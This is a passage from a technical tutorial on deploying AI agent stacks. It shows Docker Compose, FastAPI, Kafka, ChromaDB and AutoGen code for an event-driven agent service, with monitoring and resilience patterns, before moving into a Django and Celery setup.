      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,PLAINTEXT_HOST:PLAINTEXT
      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 1
    healthcheck:
      test: ["CMD", "kafka-topics", "--bootstrap-server", "localhost:9092", "--list"]
      interval: 10s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7.0-alpine
    ports:
      - "6379:6379"
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5

  chromadb:
    image: ghcr.io/chroma-core/chroma:0.4.15
    ports:
      - "8000:8000"
    volumes:
      - chroma-data:/chroma/chroma
    environment:
      - CHROMA_DB_IMPL=duckdb+parquet
      - CHROMA_PERSIST_DIRECTORY=/chroma/chroma

  agent-service:
    build:
      context: .
      dockerfile: Dockerfile.agent
    depends_on:
      kafka:
        condition: service_healthy
      redis:
        condition: service_healthy
      chromadb:
        condition: service_started
    ports:
      - "8080:8080"
    volumes:
      - ./app:/app
      - ./data:/data
    environment:
      - KAFKA_BOOTSTRAP_SERVERS=kafka:29092
      - REDIS_HOST=redis
      - REDIS_PORT=6379
      - CHROMA_HOST=chromadb
      - CHROMA_PORT=8000
      - OPENAI_API_KEY=${OPENAI_API_KEY}
    command: uvicorn app.main:app --host 0.0.0.0 --port 8080 --reload

volumes:
  chroma-data:
```

Next, let's build our FastAPI application:

```python
# app/main.py
import os
import json
import asyncio
import uuid
from datetime import datetime
from typing import Dict, List, Optional, Any

import redis
import autogen
import chromadb
from chromadb.utils import embedding_functions
from fastapi import FastAPI, BackgroundTasks, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
from aiokafka import AIOKafkaProducer, AIOKafkaConsumer
from contextlib import asynccontextmanager

# Models for API requests and responses
class AgentRequest(BaseModel):
    query: str
    user_id: str
    context: Optional[Dict[str, Any]] = None
    agent_type: str = "general"
    priority: str = "normal"

class AgentResponse(BaseModel):
    request_id: str
    status: str
    message: str
    data: Optional[Dict[str, Any]] = None
    timestamp: str = Field(default_factory=lambda: datetime.now().isoformat())

class EventData(BaseModel):
    event_type: str
    payload: Dict[str, Any]
    timestamp: str = Field(default_factory=lambda: datetime.now().isoformat())

# Configure Redis client
redis_client = redis.Redis(
    host=os.environ.get("REDIS_HOST", "localhost"),
    port=int(os.environ.get("REDIS_PORT", 6379)),
    decode_responses=True
)

# Configure ChromaDB client
chroma_client = chromadb.HttpClient(
    host=os.environ.get("CHROMA_HOST", "localhost"),
    port=int(os.environ.get("CHROMA_PORT", 8000))
)

# Configure embedding function
openai_ef = embedding_functions.OpenAIEmbeddingFunction(
    api_key=os.environ.get("OPENAI_API_KEY"),
    model_name="text-embedding-ada-002"
)

# Ensure collections exist
try:
    knowledge_collection = chroma_client.get_collection(
        name="agent_knowledge",
        embedding_function=openai_ef
    )
except:
    knowledge_collection = chroma_client.create_collection(
        name="agent_knowledge",
        embedding_function=openai_ef
    )

# Kafka configuration
KAFKA_BOOTSTRAP_SERVERS = os.environ.get("KAFKA_BOOTSTRAP_SERVERS", "localhost:9092")
AGENT_REQUEST_TOPIC = "agent_requests"
AGENT_RESPONSE_TOPIC = "agent_responses"
EVENT_TOPIC = "system_events"

# Initialize Kafka producer
producer = None

# Lifespan manager for FastAPI to handle async setup/teardown
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Setup: create global producer
    global producer
    producer = AIOKafkaProducer(
        bootstrap_servers=KAFKA_BOOTSTRAP_SERVERS,
        value_serializer=lambda v: json.dumps(v).encode('utf-8'),
        acks='all',
        enable_idempotence=True,
        retries=3
    )
    
    # Start the producer
    await producer.start()
    
    # Start the consumer tasks
    consumer_task = asyncio.create_task(consume_agent_responses())
    event_consumer_task = asyncio.create_task(consume_events())
    
    # Yield control back to FastAPI
    yield
    
    # Cleanup: close producer and cancel consumer tasks
    consumer_task.cancel()
    event_consumer_task.cancel()
    
    try:
        await consumer_task
    except asyncio.CancelledError:
        pass
    
    try:
        await event_consumer_task
    except asyncio.CancelledError:
        pass
    
    await producer.stop()

# Initialize FastAPI
app = FastAPI(lifespan=lifespan)

# Configure CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Agent factory for creating different agent types
class AgentFactory:
    @staticmethod
    def create_agent(agent_type, context=None):
        llm_config = {
            "config_list": [
                {
                    "model": "gpt-4",
                    "api_key": os.environ.get("OPENAI_API_KEY")
                }
            ],
            "temperature": 0.5,
            "timeout": 120,
            "cache_seed": None  # Disable caching for real-time applications
        }
        
        if agent_type == "analyst":
            system_message = """You are a financial analyst agent specialized in market trends
            and investment strategies. Analyze data precisely and provide actionable insights."""
            
            # Add specific functions for analyst
            llm_config["functions"] = [
                {
                    "name": "analyze_market_data",
                    "description": "Analyze market data to identify trends and opportunities",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "sector": {"type": "string", "description": "Market sector to analyze"},
                            "timeframe": {"type": "string", "description": "Timeframe for analysis (e.g., '1d', '1w', '1m')"},
                            "metrics": {"type": "array", "items": {"type": "string"}, "description": "Metrics to include in analysis"}
                        },
                        "required": ["sector", "timeframe"]
                    }
                }
            ]
            
        elif agent_type == "support":
            system_message = """You are a customer support agent that helps users with
            technical issues and product questions. Be empathetic and solution-oriented."""
            
        else:  # default general agent
            system_message = """You are a helpful AI assistant that provides accurate and
            concise information on a wide range of topics."""
        
        # Create the agent
        agent = autogen.AssistantAgent(
            name=f"{agent_type.capitalize()}Agent",
            system_message=system_message,
            llm_config=llm_config
        )
        
        return agent

# Function to retrieve relevant knowledge for agent context
async def retrieve_knowledge(query, filters=None, limit=5):
    try:
        results = knowledge_collection.query(
            query_texts=[query],
            n_results=limit,
            where=filters
        )
        
        if results and len(results['documents']) > 0:
            documents = results['documents'][0]
            metadatas = results['metadatas'][0] if 'metadatas' in results else [{}] * len(documents)
            distances = results['distances'][0] if 'distances' in results else [1.0] * len(documents)
            
            return [
                {
                    "content": doc,
                    "metadata": meta,
                    "relevance": 1 - dist if dist <= 1 else 0
                }
                for doc, meta, dist in zip(documents, metadatas, distances)
            ]
        return []
    except Exception as e:
        print(f"Error retrieving knowledge: {e}")
        return []

# Background task to process agent request through Kafka
async def process_agent_request(request_id: str, request: AgentRequest):
    try:
        # Publish request to Kafka
        await producer.send_and_wait(
            AGENT_REQUEST_TOPIC,
            {
                "request_id": request_id,
                "query": request.query,
                "user_id": request.user_id,
                "context": request.context,
                "agent_type": request.agent_type,
                "priority": request.priority,
                "timestamp": datetime.now().isoformat()
            }
        )
        
        # Update request status in Redis
        redis_client.hset(
            f"request:{request_id}",
            mapping={
                "status": "processing",
                "timestamp": datetime.now().isoformat()
            }
        )
        redis_client.expire(f"request:{request_id}", 3600)  # Expire after 1 hour
        
        # Publish event
        await producer.send_and_wait(
            EVENT_TOPIC,
            {
                "event_type": "agent_request_received",
                "payload": {
                    "request_id": request_id,
                    "user_id": request.user_id,
                    "agent_type": request.agent_type,
                    "priority": request.priority
                },
                "timestamp": datetime.now().isoformat()
            }
        )
        
    except Exception as e:
        # Update request status in Redis
        redis_client.hset(
            f"request:{request_id}",
            mapping={
                "status": "error",
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }
        )
        redis_client.expire(f"request:{request_id}", 3600)  # Expire after 1 hour
        
        # Publish error event
        await producer.send_and_wait(
            EVENT_TOPIC,
            {
                "event_type": "agent_request_error",
                "payload": {
                    "request_id": request_id,
                    "error": str(e)
                },
                "timestamp": datetime.now().isoformat()
            }
        )

# Consumer for agent responses
async def consume_agent_responses():
    consumer = AIOKafkaConsumer(
        AGENT_RESPONSE_TOPIC,
        bootstrap_servers=KAFKA_BOOTSTRAP_SERVERS,
        group_id="agent-service-group",
        value_deserializer=lambda m: json.loads(m.decode('utf-8')),
        auto_offset_reset="latest",
        enable_auto_commit=True
    )
    
    await consumer.start()
    
    try:
        async for message in consumer:
            response_data = message.value
            request_id = response_data.get("request_id")
            
            if request_id:
                # Update response in Redis
                redis_client.hset(
                    f"request:{request_id}",
                    mapping={
                        "status": "completed",
                        "response": json.dumps(response_data),
                        "completed_at": datetime.now().isoformat()
                    }
                )
                
                # Publish completion event
                await producer.send(
                    EVENT_TOPIC,
                    {
                        "event_type": "agent_response_completed",
                        "payload": {
                            "request_id": request_id,
                            "processing_time": response_data.get("processing_time")
                        },
                        "timestamp": datetime.now().isoformat()
                    }
                )
    finally:
        await consumer.stop()

# Consumer for system events
async def consume_events():
    consumer = AIOKafkaConsumer(
        EVENT_TOPIC,
        bootstrap_servers=KAFKA_BOOTSTRAP_SERVERS,
        group_id="event-processor-group",
        value_deserializer=lambda m: json.loads(m.decode('utf-8')),
        auto_offset_reset="latest",
        enable_auto_commit=True
    )
    
    await consumer.start()
    
    try:
        async for message in consumer:
            event_data = message.value
            event_type = event_data.get("event_type")
            
            # Process different event types
            if event_type == "agent_request_received":
                # Metrics tracking
                pass
            elif event_type == "agent_response_completed":
                # Performance monitoring
                pass
            elif event_type == "agent_request_error":
                # Error handling and alerting
                pass
    finally:
        await consumer.stop()

# Worker process that handles agent requests from Kafka
async def agent_worker():
    consumer = AIOKafkaConsumer(
        AGENT_REQUEST_TOPIC,
        bootstrap_servers=KAFKA_BOOTSTRAP_SERVERS,
        group_id="agent-worker-group",
        value_deserializer=lambda m: json.loads(m.decode('utf-8')),
        auto_offset_reset="earliest",
        enable_auto_commit=True
    )
    
    await consumer.start()
    
    try:
        async for message in consumer:
            request_data = message.value
            request_id = request_data.get("request_id")
            
            start_time = datetime.now()
            
            try:
                # Create appropriate agent type
                agent = AgentFactory.create_agent(
                    request_data.get("agent_type", "general"),
                    context=request_data.get("context")
                )
                
                # Retrieve relevant knowledge
                knowledge = await retrieve_knowledge(
                    request_data.get("query"),
                    filters={"domain": request_data.get("context", {}).get("domain")} if request_data.get("context") else None
                )
                
                # Create user proxy agent for handling the conversation
                user_proxy = autogen.UserProxyAgent(
                    name="User",
                    human_input_mode="NEVER",
                    max_consecutive_auto_reply=0,
                    code_execution_config={"work_dir": "workspace"}
                )
                
                # Build the prompt with knowledge context
                knowledge_context = ""
                if knowledge:
                    knowledge_context = "\n\nRelevant context:\n"
                    for i, item in enumerate(knowledge, 1):
                        knowledge_context += f"{i}. {item['content']}\n"
                
                query = request_data.get("query")
                message = f"{query}\n{knowledge_context}"
                
                # Start conversation with agent
                user_proxy.initiate_chat(agent, message=message)
                
                # Extract agent response
                response_content = ""
                if user_proxy.chat_history and len(user_proxy.chat_history) > 1:
                    # Get the last message from the agent
                    for msg in reversed(user_proxy.chat_history):
                        if msg.get("role") == "assistant":
                            response_content = msg.get("content", "")
                            break
                
                processing_time = (datetime.now() - start_time).total_seconds()
                
                # Send response back through Kafka
                await producer.send_and_wait(
                    AGENT_RESPONSE_TOPIC,
                    {
                        "request_id": request_id,
                        "status": "success",
                        "response": response_content,
                        "processing_time": processing_time,
                        "timestamp": datetime.now().isoformat()
                    }
                )
                
            except Exception as e:
                processing_time = (datetime.now() - start_time).total_seconds()
                
                # Send error response
                await producer.send_and_wait(
                    AGENT_RESPONSE_TOPIC,
                    {
                        "request_id": request_id,
                        "status": "error",
                        "error": str(e),
                        "processing_time": processing_time,
                        "timestamp": datetime.now().isoformat()
                    }
                )
    finally:
        await consumer.stop()

# Routes
@app.post("/api/agent/request", response_model=AgentResponse)
async def create_agent_request(request: AgentRequest, background_tasks: BackgroundTasks):
    request_id = str(uuid.uuid4())
    
    # Store initial request in Redis
    redis_client.hset(
        f"request:{request_id}",
        mapping={
            "user_id": request.user_id,
            "query": request.query,
            "agent_type": request.agent_type,
            "status": "pending",
            "timestamp": datetime.now().isoformat()
        }
    )
    redis_client.expire(f"request:{request_id}", 3600)  # Expire after 1 hour
    
    # Process request asynchronously
    background_tasks.add_task(process_agent_request, request_id, request)
    
    return AgentResponse(
        request_id=request_id,
        status="pending",
        message="Request has been submitted for processing"
    )

@app.get("/api/agent/status/{request_id}", response_model=AgentResponse)
async def get_agent_status(request_id: str):
    # Check if request exists in Redis
    request_data = redis_client.hgetall(f"request:{request_id}")
    
    if not request_data:
        raise HTTPException(status_code=404, detail="Request not found")
    
    status = request_data.get("status", "unknown")
    
    if status == "completed":
        # Return the completed response
        response_data = json.loads(request_data.get("response", "{}"))
        return AgentResponse(
            request_id=request_id,
            status=status,
            message="Request completed",
            data=response_data
        )
    elif status == "error":
        # Return error details
        return AgentResponse(
            request_id=request_id,
            status=status,
            message=f"Error processing request: {request_data.get('error', 'Unknown error')}",
        )
    else:
        # Return current status
        return AgentResponse(
            request_id=request_id,
            status=status,
            message=f"Request is currently {status}"
        )

@app.post("/api/events/publish", status_code=202)
async def publish_event(event: EventData):
    try:
        await producer.send_and_wait(
            EVENT_TOPIC,
            event.dict()
        )
        return {"status": "success", "message": "Event published successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to publish event: {str(e)}")

@app.post("/api/knowledge/add")
async def add_knowledge(items: List[Dict[str, Any]]):
    try:
        documents = [item["content"] for item in items]
        metadata = [item.get("metadata", {}) for item in items]
        ids = [f"doc_{uuid.uuid4()}" for _ in items]
        
        knowledge_collection.add(
            documents=documents,
            metadatas=metadata,
            ids=ids
        )
        
        return {"status": "success", "message": f"Added {len(documents)} items to knowledge base"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to add knowledge: {str(e)}")

@app.get("/api/knowledge/search")
async def search_knowledge(query: str, limit: int = 5):
    knowledge = await retrieve_knowledge(query, limit=limit)
    return {"results": knowledge}

# Start worker process when app starts
@app.on_event("startup")
async def startup_event():
    asyncio.create_task(agent_worker())

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8080, reload=True)
```

**Client Implementation Example:**

```python
# client.py
import asyncio
import json
import time
import uuid
from typing import Dict, List, Any, Optional

import aiohttp
from pydantic import BaseModel

class AgentClient:
    def __init__(self, base_url: str = "http://localhost:8080"):
        self.base_url = base_url
        self.session = None
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def submit_request(self, query: str, user_id: str, 
                           agent_type: str = "general", 
                           context: Optional[Dict[str, Any]] = None,
                           priority: str = "normal") -> Dict[str, Any]:
        """Submit a request to the agent service."""
        if self.session is None:
            self.session = aiohttp.ClientSession()
        
        payload = {
            "query": query,
            "user_id": user_id,
            "agent_type": agent_type,
            "priority": priority
        }
        
        if context:
            payload["context"] = context
        
        async with self.session.post(
            f"{self.base_url}/api/agent/request",
            json=payload
        ) as response:
            if response.status == 200:
                return await response.json()
            else:
                error_text = await response.text()
                raise Exception(f"Error submitting request: {error_text}")
    
    async def get_request_status(self, request_id: str) -> Dict[str, Any]:
        """Get the status of a request."""
        if self.session is None:
            self.session = aiohttp.ClientSession()
        
        async with self.session.get(
            f"{self.base_url}/api/agent/status/{request_id}"
        ) as response:
            if response.status == 200:
                return await response.json()
            else:
                error_text = await response.text()
                raise Exception(f"Error getting status: {error_text}")
    
    async def wait_for_completion(self, request_id: str, 
                                polling_interval: float = 1.0,
                                timeout: float = 120.0) -> Dict[str, Any]:
        """Wait for a request to complete, with timeout."""
        start_time = time.time()
        
        while (time.time() - start_time) < timeout:
            status_response = await self.get_request_status(request_id)
            
            if status_response["status"] in ["completed", "error"]:
                return status_response
            
            await asyncio.sleep(polling_interval)
        
        raise TimeoutError(f"Request {request_id} did not complete within {timeout} seconds")
    
    async def add_knowledge(self, items: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Add knowledge items to the agent knowledge base."""
        if self.session is None:
            self.session = aiohttp.ClientSession()
        
        async with self.session.post(
            f"{self.base_url}/api/knowledge/add",
            json=items
        ) as response:
            if response.status == 200:
                return await response.json()
            else:
                error_text = await response.text()
                raise Exception(f"Error adding knowledge: {error_text}")
    
    async def search_knowledge(self, query: str, limit: int = 5) -> Dict[str, Any]:
        """Search the knowledge base."""
        if self.session is None:
            self.session = aiohttp.ClientSession()
        
        async with self.session.get(
            f"{self.base_url}/api/knowledge/search",
            params={"query": query, "limit": limit}
        ) as response:
            if response.status == 200:
                return await response.json()
            else:
                error_text = await response.text()
                raise Exception(f"Error searching knowledge: {error_text}")

async def main():
    # Example client usage
    async with AgentClient() as client:
        # Add knowledge first
        knowledge_items = [
            {
                "content": "Apple Inc. reported Q4 2023 earnings of $1.46 per share, exceeding analyst expectations of $1.39 per share.",
                "metadata": {
                    "domain": "finance",
                    "category": "earnings",
                    "company": "Apple",
                    "date": "2023-10-27"
                }
            },
            {
                "content": "The S&P 500 closed at 4,738.15 on January 12, 2024, up 1.2% for the day.",
                "metadata": {
                    "domain": "finance",
                    "category": "market_data",
                    "index": "S&P 500",
                    "date": "2024-01-12"
                }
            }
        ]
        
        knowledge_result = await client.add_knowledge(knowledge_items)
        print(f"Knowledge add result: {json.dumps(knowledge_result, indent=2)}")
        
        # Submit a request to the analyst agent
        request_result = await client.submit_request(
            query="What was Apple's performance in their most recent earnings report?",
            user_id="test-user-123",
            agent_type="analyst",
            context={
                "domain": "finance",
                "analysis_type": "earnings"
            }
        )
        
        print(f"Request submitted: {json.dumps(request_result, indent=2)}")
        request_id = request_result["request_id"]
        
        # Wait for completion
        try:
            completion_result = await client.wait_for_completion(
                request_id,
                polling_interval=2.0,
                timeout=60.0
            )
            
            print(f"Request completed: {json.dumps(completion_result, indent=2)}")
            
        except TimeoutError as e:
            print(f"Request timed out: {e}")

if __name__ == "__main__":
    asyncio.run(main())
```

**Key Advantages:**

1. **Real-Time Processing**: Stream processing via Kafka enables immediate response to events
2. **Decoupling**: Producers and consumers are decoupled, enabling system resilience
3. **Scalability**: Each component can scale independently based on demand
4. **Event Sourcing**: All interactions are event-based, enabling replay and audit capabilities
5. **Statelessness**: API services remain stateless for easier scaling and deployment

**Production Considerations:**

1. **Kafka Topic Configuration**:

```python
# kafka_setup.py
from kafka.admin import KafkaAdminClient, NewTopic
import kafka.errors as errors

def setup_kafka_topics():
    admin_client = KafkaAdminClient(
        bootstrap_servers="localhost:9092",
        client_id="admin-client"
    )
    
    # Define topics with optimal configurations
    topic_configs = [
        # Agent request topic - moderate throughput with ordered processing
        NewTopic(
            name="agent_requests",
            num_partitions=4,  # Balance parallelism and ordering
            replication_factor=3,  # High reliability for requests
            topic_configs={
                "retention.ms": str(7 * 24 * 60 * 60 * 1000),  # 7 days retention
                "cleanup.policy": "delete",
                "min.insync.replicas": "2",  # Ensure at least 2 replicas are in sync
                "unclean.leader.election.enable": "false",  # Prevent data loss
                "compression.type": "lz4"  # Efficient compression
            }
        ),
        
        # Agent response topic - higher throughput, less ordering dependency
        NewTopic(
            name="agent_responses",
            num_partitions=8,  # Higher parallelism for responses
            replication_factor=3,
            topic_configs={
                "retention.ms": str(7 * 24 * 60 * 60 * 1000),  # 7 days retention
                "cleanup.policy": "delete",
                "min.insync.replicas": "2",
                "compression.type": "lz4"
            }
        ),
        
        # System events topic - high volume, compacted for latest state
        NewTopic(
            name="system_events",
            num_partitions=16,  # High parallelism for metrics and events
            replication_factor=3,
            topic_configs={
                "cleanup.policy": "compact,delete",  # Compact for state, delete for retention
                "delete.retention.ms": str(24 * 60 * 60 * 1000),  # 1 day retention after compaction
                "min.compaction.lag.ms": str(60 * 1000),  # 1 minute minimum time before compaction
                "segment.ms": str(6 * 60 * 60 * 1000),  # 6 hour segments
                "min.insync.replicas": "2",
                "compression.type": "lz4"
            }
        )
    ]
    
    # Create topics
    for topic in topic_configs:
        try:
            admin_client.create_topics([topic])
            print(f"Created topic: {topic.name}")
        except errors.TopicAlreadyExistsError:
            print(f"Topic already exists: {topic.name}")
    
    admin_client.close()

if __name__ == "__main__":
    setup_kafka_topics()
```

2. **Monitoring and Metrics**:

```python
# monitoring.py
import time
import json
from datadog import initialize, statsd
from functools import wraps
from contextlib import ContextDecorator

# Initialize Datadog client
initialize(statsd_host="localhost", statsd_port=8125)

class TimingMetric(ContextDecorator):
    """Context manager/decorator for timing operations and reporting to Datadog."""
    
    def __init__(self, metric_name, tags=None):
        self.metric_name = metric_name
        self.tags = tags or []
        self.start_time = None
    
    def __enter__(self):
        self.start_time = time.monotonic()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        duration = time.monotonic() - self.start_time
        # Convert to milliseconds
        duration_ms = duration * 1000
        
        # Send timing metric
        statsd.timing(self.metric_name, duration_ms, tags=self.tags)
        
        # Also send as gauge for easier aggregation
        statsd.gauge(f"{self.metric_name}.gauge", duration_ms, tags=self.tags)
        
        # If there was an exception, count it
        if exc_type is not None:
            statsd.increment(
                f"{self.metric_name}.error",
                tags=self.tags + [f"error_type:{exc_type.__name__}"]
            )
        
        # Don't suppress exceptions
        return False

def timing_decorator(metric_name, tags=None):
    """Function decorator for timing."""
    def decorator(func):
        @wraps(func)
        async def async_wrapper(*args, **kwargs):
            with TimingMetric(metric_name, tags):
                return await func(*args, **kwargs)
        
        @wraps(func)
        def sync_wrapper(*args, **kwargs):
            with TimingMetric(metric_name, tags):
                return func(*args, **kwargs)
        
        # Choose the appropriate wrapper based on whether the function is async
        return async_wrapper if asyncio.iscoroutinefunction(func) else sync_wrapper
    
    return decorator

# Usage example with modified agent_worker function
@timing_decorator("agent.request.processing", tags=["service:agent_worker"])
async def process_agent_request(request_data):
    # Implementation as before
    request_id = request_data.get("request_id")
    agent_type = request_data.get("agent_type", "general")
    
    # Increment counter for request by agent type
    statsd.increment("agent.request.count", tags=[
        f"agent_type:{agent_type}",
        f"priority:{request_data.get('priority', 'normal')}"
    ])
    
    # Original implementation continues...
    # ...
    
    # At the end, count completion
    statsd.increment("agent.request.completed", tags=[
        f"agent_type:{agent_type}",
        f"status:success"
    ])
    
    return result

# Kafka consumer with metrics
async def consume_agent_responses():
    consumer = AIOKafkaConsumer(
        AGENT_RESPONSE_TOPIC,
        bootstrap_servers=KAFKA_BOOTSTRAP_SERVERS,
        group_id="agent-service-group",
        value_deserializer=lambda m: json.loads(m.decode('utf-8')),
        auto_offset_reset="latest",
        enable_auto_commit=True
    )
    
    await consumer.start()
    
    try:
        async for message in consumer:
            # Track consumer lag
            lag = time.time() - message.timestamp/1000
            statsd.gauge("kafka.consumer.lag_seconds", lag, tags=[
                "topic:agent_responses",
                "consumer_group:agent-service-group"
            ])
            
            # Process message with timing
            with TimingMetric("kafka.message.processing", tags=["topic:agent_responses"]):
                response_data = message.value
                # Process as before...
                # ...
    finally:
        await consumer.stop()
```

3. **Resilience and Circuit Breaking**:

```python
# resilience.py
import time
import asyncio
import functools
from typing import Callable, Any, Dict, Optional
import backoff
from fastapi import HTTPException

# Circuit breaker implementation
class CircuitBreaker:
    def __init__(self, failure_threshold: int = 5, recovery_timeout: float = 30.0, 
                 timeout: float = 10.0, fallback: Optional[Callable] = None):
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self.timeout = timeout
        self.fallback = fallback
        self.failure_count = 0
        self.last_failure_time = 0
        self.state = "CLOSED"  # CLOSED, OPEN, HALF-OPEN
    
    def __call__(self, func):
        @functools.wraps(func)
        async def async_wrapper(*args, **kwargs):
            if asyncio.iscoroutinefunction(func):
                return await self._handle_call(func, *args, **kwargs)
            else:
                return self._handle_sync_call(func, *args, **kwargs)
        
        @functools.wraps(func)
        def sync_wrapper(*args, **kwargs):
            return self._handle_sync_call(func, *args, **kwargs)
        
        return async_wrapper if asyncio.iscoroutinefunction(func) else sync_wrapper
    
    async def _handle_call(self, func, *args, **kwargs):
        if self.state == "OPEN":
            if time.time() - self.last_failure_time > self.recovery_timeout:
                # Move to half-open state and try the call
                self.state = "HALF-OPEN"
            else:
                # Circuit is open, use fallback or raise exception
                if self.fallback:
                    return await self.fallback(*args, **kwargs) if asyncio.iscoroutinefunction(self.fallback) else self.fallback(*args, **kwargs)
                else:
                    raise HTTPException(status_code=503, detail="Service temporarily unavailable")
        
        try:
            # Set timeout for the function call
            result = await asyncio.wait_for(func(*args, **kwargs), timeout=self.timeout)
            
            # On success in half-open state, reset the circuit
            if self.state == "HALF-OPEN":
                self.failure_count = 0
                self.state = "CLOSED"
            
            return result
            
        except Exception as e:
            # On failure, increment failure count
            self.failure_count += 1
            self.last_failure_time = time.time()
            
            # If failure threshold reached, open the circuit
            if self.failure_count >= self.failure_threshold:
                self.state = "OPEN"
            
            # If in half-open state, go back to open state
            if self.state == "HALF-OPEN":
                self.state = "OPEN"
            
            # Use fallback or re-raise the exception
            if self.fallback:
                return await self.fallback(*args, **kwargs) if asyncio.iscoroutinefunction(self.fallback) else self.fallback(*args, **kwargs)
            raise e
    
    def _handle_sync_call(self, func, *args, **kwargs):
        if self.state == "OPEN":
            if time.time() - self.last_failure_time > self.recovery_timeout:
                self.state = "HALF-OPEN"
            else:
                if self.fallback:
                    return self.fallback(*args, **kwargs)
                else:
                    raise HTTPException(status_code=503, detail="Service temporarily unavailable")
        
        try:
            # For sync functions, we can't easily apply a timeout
            # Consider using concurrent.futures.ThreadPoolExecutor with timeout for sync functions
            result = func(*args, **kwargs)
            
            if self.state == "HALF-OPEN":
                self.failure_count = 0
                self.state = "CLOSED"
            
            return result
            
        except Exception as e:
            self.failure_count += 1
            self.last_failure_time = time.time()
            
            if self.failure_count >= self.failure_threshold:
                self.state = "OPEN"
            
            if self.state == "HALF-OPEN":
                self.state = "OPEN"
            
            if self.fallback:
                return self.fallback(*args, **kwargs)
            raise e

# Exponential backoff with jitter for retries
def backoff_llm_call(max_tries=5, max_time=30):
    def fallback_response(*args, **kwargs):
        return {
            "status": "degraded",
            "message": "Service temporarily in degraded mode. Please try again later."
        }
    
    # Define backoff handler with jitter
    @backoff.on_exception(
        backoff.expo,
        (Exception),  # Retry on any exception
        max_tries=max_tries,
        max_time=max_time,
        jitter=backoff.full_jitter,
        on_backoff=lambda details: print(f"Backing off {details['wait']:0.1f} seconds after {details['tries']} tries")
    )
    @CircuitBreaker(
        failure_threshold=3,
        recovery_timeout=60.0,
        timeout=10.0,
        fallback=fallback_response
    )
    async def protected_llm_call(client, prompt, model="gpt-4"):
        # This would be your actual LLM API call
        response = await client.chat.completions.create(
            model=model,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=1000
        )
        return response
    
    return protected_llm_call

# Example usage in agent implementation
async def agent_worker():
    consumer = AIOKafkaConsumer(
        AGENT_REQUEST_TOPIC,
        bootstrap_servers=KAFKA_BOOTSTRAP_SERVERS,
        group_id="agent-worker-group",
        value_deserializer=lambda m: json.loads(m.decode('utf-8')),
        auto_offset_reset="earliest",
        enable_auto_commit=True
    )
    
    await consumer.start()
    
    # Create OpenAI client
    from openai import AsyncOpenAI
    client = AsyncOpenAI(api_key=os.environ.get("OPENAI_API_KEY"))
    
    # Create protected LLM call function with backoff and circuit breaker
    protected_llm = backoff_llm_call(max_tries=3, max_time=45)
    
    try:
        async for message in consumer:
            request_data = message.value
            request_id = request_data.get("request_id")
            
            start_time = datetime.now()
            
            try:
                # Process with resilience patterns
                query = request_data.get("query")
                
                try:
                    # Make resilient LLM call
                    llm_response = await protected_llm(client, query)
                    
                    # Process response
                    response_content = llm_response.choices[0].message.content
                    
                    # Calculate processing time
                    processing_time = (datetime.now() - start_time).total_seconds()
                    
                    # Send response
                    await producer.send_and_wait(
                        AGENT_RESPONSE_TOPIC,
                        {
                            "request_id": request_id,
                            "status": "success",
                            "response": response_content,
                            "processing_time": processing_time,
                            "timestamp": datetime.now().isoformat()
                        }
                    )
                
                except Exception as e:
                    # Handle failures with proper error reporting
                    processing_time = (datetime.now() - start_time).total_seconds()
                    
                    await producer.send_and_wait(
                        AGENT_RESPONSE_TOPIC,
                        {
                            "request_id": request_id,
                            "status": "error",
                            "error": str(e),
                            "processing_time": processing_time,
                            "timestamp": datetime.now().isoformat()
                        }
                    )
                    
                    # Also log the error for monitoring
                    statsd.increment("agent.error", tags=[
                        f"error_type:{type(e).__name__}",
                        f"request_id:{request_id}"
                    ])
            
            except Exception as e:
                # Catch-all exception handler to prevent worker crashes
                print(f"Critical error in message processing: {e}")
                
                # Log critical errors for immediate attention
                statsd.increment("agent.critical_error", tags=[
                    f"error_type:{type(e).__name__}"
                ])
    
    finally:
        await consumer.stop()
```

This stack is particularly well-suited for organizations that need to:

- Process streaming data in real-time with AI analysis
- Build responsive event-driven systems
- Implement asynchronous request/response patterns
- Support high-throughput messaging with reliable delivery
- Maintain a flexible, decoupled architecture

### Django/Flask + Celery + AutoGen + Pinecone (Task Orchestration & Search)

This stack is optimized for applications that require robust task management, background processing, and sophisticated search capabilities. It's particularly well-suited for document processing, content recommendation, and task-based AI workflows.

**Architecture Overview:**

![Django + Celery + AutoGen Architecture](https://i.imgur.com/U2BKxGF.png)

The architecture consists of:

1. **Django/Flask**: Web framework for user interaction and API endpoints
2. **Celery**: Distributed task queue for background processing
3. **Redis/RabbitMQ**: Message broker for Celery tasks
4. **AutoGen**: Multi-agent orchestration framework
5. **Pinecone**: Vector database for semantic search
6. **PostgreSQL**: Relational database for application data and task state

**Implementation Example:**

Let's implement a Django application with Celery tasks for AI agent processing:

First, the Django project structure:

```
project/
├── manage.py
├── requirements.txt
├── project/
│   ├── __init__.py
│   ├── settings.py
│   ├── urls.py
│   └── celery.py
├── agent_app/
│   ├── __init__.py
│   ├── admin.py
│   ├── apps.py
│   ├── models.py
│   ├── serializers.py
│   ├── tasks.py
│   ├── tests.py
│   ├── urls.py
│   ├── utils/
│   │   ├── __init__.py
│   │   ├── agent_factory.py
│   │   ├── pinecone_client.py
